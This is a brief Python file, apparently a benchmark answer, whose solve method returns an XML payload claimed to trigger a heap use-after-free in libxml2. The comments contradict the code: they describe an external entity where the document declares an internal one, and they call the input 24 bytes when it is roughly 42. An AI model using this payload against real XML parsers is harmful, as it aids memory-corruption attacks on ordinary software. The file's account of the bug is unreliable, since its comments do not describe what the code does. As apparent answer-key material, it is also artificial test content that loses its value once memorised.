import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC triggers a heap use-after-free vulnerability in libxml2
        # by creating an XML document with an external entity that causes
        # the encoding handler to be improperly freed and later used.
        # The exact 24-byte ground-truth PoC from the vulnerability report.
        return b'<!DOCTYPE a [\n<!ENTITY x "">\n]><a>&x;</a>'
